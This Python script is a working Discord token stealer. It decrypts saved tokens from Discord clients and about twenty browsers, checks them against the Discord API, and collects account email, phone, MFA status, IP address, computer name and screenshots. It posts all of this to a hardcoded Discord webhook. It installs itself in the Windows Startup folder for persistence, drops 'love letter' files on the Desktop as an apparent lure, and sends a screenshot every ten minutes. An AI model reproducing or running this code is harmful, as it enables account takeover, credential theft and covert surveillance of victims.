tokens = []
cleaned = []
checker = []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except:
        return "Error"

def getip():
    ip = "None"
    try:
        ip = urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except: pass
    return ip

def gethwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]

def screen():
    screenshot = ImageGrab.grab()
    img_byte_arr = io.BytesIO()
    screenshot.save(img_byte_arr, format='PNG')
    img_byte_arr = img_byte_arr.getvalue()
    return img_byte_arr

def get_info():
    already_check = []
    checker = []
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Amigo': local + '\\Amigo\\User Data',
        'Torch': local + '\\Torch\\User Data',
        'Kometa': local + '\\Kometa\\User Data',
        'Orbitum': local + '\\Orbitum\\User Data',
        'CentBrowser': local + '\\CentBrowser\\User Data',
        '7Star': local + '\\7Star\\7Star\\User Data',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
        'Chrome': chrome + '\\Default',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Iridium': local + '\\Iridium\\User Data\\Default'
    }
    for platform, path in paths.items():
        if not os.path.exists(path): continue
        try:
            with open(path + "\\Local State", "r") as file:
                key = loads(file.read())['os_crypt']['encrypted_key']
                file.close()
        except: continue
        leveldb_path = path + "\\Local Storage\\leveldb\\"
        if not os.path.exists(leveldb_path): continue
        for file in listdir(leveldb_path):
            if not file.endswith(".ldb") and not file.endswith(".log"): continue
            try:
                with open(leveldb_path + file, "r", errors='ignore') as files:
                    for x in files.readlines():
                        x.strip()
                        for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
                            tokens.append(values)
            except PermissionError: continue
        for i in tokens:
            if i.endswith("\\"):
                i = i.replace("\\", "")
            if i not in cleaned:
                cleaned.append(i)
        for token in cleaned:
            try:
                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])
            except IndexError:
                continue
            checker.append(tok)
            for value in checker:
                if value not in already_check:
                    already_check.append(value)
                    headers = {'Authorization': tok, 'Content-Type': 'application/json'}
                    try:
                        res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
                    except:
                        continue
                    if res.status_code == 200:
                        res_json = res.json()
                        ip = getip()
                        pc_username = os.getenv("UserName")
                        pc_name = os.getenv("COMPUTERNAME")
                        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
                        user_id = res_json['id']
                        email = res_json['email']
                        phone = res_json['phone']
                        mfa_enabled = res_json['mfa_enabled']
                        has_nitro = False
                        res = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers)
                        nitro_data = res.json()
                        has_nitro = bool(len(nitro_data) > 0)
                        days_left = 0
                        if has_nitro:
                            d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                            days_left = abs((d2 - d1).days)
                        embed = f"""**{user_name}** *({user_id})*\n
> :dividers: __User__\n\tEm: `{email}`\n\tNumber: `{phone}`\n\tEnabled: `{mfa_enabled}`\n\tBoost: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC__\n\tIP: `{ip}`\n\tNome: `{pc_username}`\n\tName: `{pc_name}`\n\tPlataforma: `{platform}`\n
> :piÃ±ata: __Info__\n\t`{tok}`\n
** **|** ||https://github.com/StormGab1/||"""

                        screenshot = screen()
                        files = {
                            'file': ('screenshot.png', screenshot, 'image/png')
                        }
                        payload = {
                            'content': embed,
                            'username': 'Spidey Bot',
                            'avatar_url': 'https://cdn.discordapp.com/attachments/1239391256577314818/1242308643354050610/image.png?ex=664d5d95&is=664c0c15&hm=59753a86884cb93f277fda87b65ee81644fba41bd12c1d6194f765cc611ea74f&'
                        }

                        try:
                            req = requests.post('https://discord.com/api/webhooks/1242289694709125222/LtPHc-54luM-2vVcPISesOVEZ_YnXRMaY24-bGBuWzTt1WMoiTuvmubXJCaunmDgws9d', data=payload, files=files)
                        except: continue
                else: continue

    if not already_check:
        ip = getip()
        pc_username = os.getenv("UserName")
        pc_name = os.getenv("COMPUTERNAME")
        embed = f"""No valid\n
> :computer: __PC__\n\tIP: `{ip}`\n\tUser: `{pc_username}`\n\tName: `{pc_name}`\n"""

        screenshot = screen()
        files = {
            'file': ('screenshot.png', screenshot, 'image/png')
        }
        payload = {
            'content': embed,
            'username': 'Spidey',
            'avatar_url': 'https://cdn.discordapp.com/attachments/1239391256577314818/1242308643354050610/image.png?ex=664d5d95&is=664c0c15&hm=59753a86884cb93f277fda87b65ee81644fba41bd12c1d6194f765cc611ea74f&'
        }

        try:
            req = requests.post('https://discord.com/api/webhooks/1242289694709125222/LtPHc-54luM-2vVcPISesOVEZ_YnXRMaY24-bGBuWzTt1WMoiTuvmubXJCaunmDgws9d', data=payload, files=files)
        except: pass

def add_to_startup():
    executable_path = sys.executable
    startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup', os.path.basename(executable_path))
    if not os.path.exists(startup_path):
        try:
            shutil.copyfile(executable_path, startup_path)
            print(0)
        except Exception as e:
            print(1)
    else:
        print(2)

def Im():
    screenshot = screen()

    payload = {
        "file": ("screenshot.png", screenshot, "image/png")
    }

    response = requests.post("https://discord.com/api/webhooks/1242289694709125222/LtPHc-54luM-2vVcPISesOVEZ_YnXRMaY24-bGBuWzTt1WMoiTuvmubXJCaunmDgws9d", files=payload)

def Carta():
    url_github_raw = "https://raw.githubusercontent.com/StormGab1/Repository2234/main/Love"

    try:
        resposta = requests.get(url_github_raw)
        resposta.raise_for_status()
        conteudo = resposta.text
        
        caminho_arquivo = str(Path.home() / "Desktop" / "Carta.txt")
        
        with open(caminho_arquivo, "w", encoding="utf-8") as arquivo:
            arquivo.write(conteudo)
        
        print(1)
        
    except requests.RequestException as e:
        print(1)
        return None

    except Exception as e:
        print(1)
        return None
    
def Imagem():
    try:
        resposta = requests.get("https://raw.githubusercontent.com/StormGab1/Repository2234/main/link")
        resposta.raise_for_status()
        url_imagem = resposta.text.strip()

        caminho_arquivo = os.path.join(os.path.expanduser("~"), "Desktop", "Love.jpg")

        resposta_imagem = requests.get(url_imagem, stream=True)
        resposta_imagem.raise_for_status()
        with open(caminho_arquivo, 'wb') as arquivo:
            for parte in resposta_imagem.iter_content(chunk_size=128):
                arquivo.write(parte)

        print(1)
    except Exception as e:
        print(2)

if __name__ == '__main__':
    add_to_startup()
    get_info()
    Carta()
    Imagem()
    time.sleep(20)
    get_info()
    
    while True:
        time.sleep(600)
        Im()
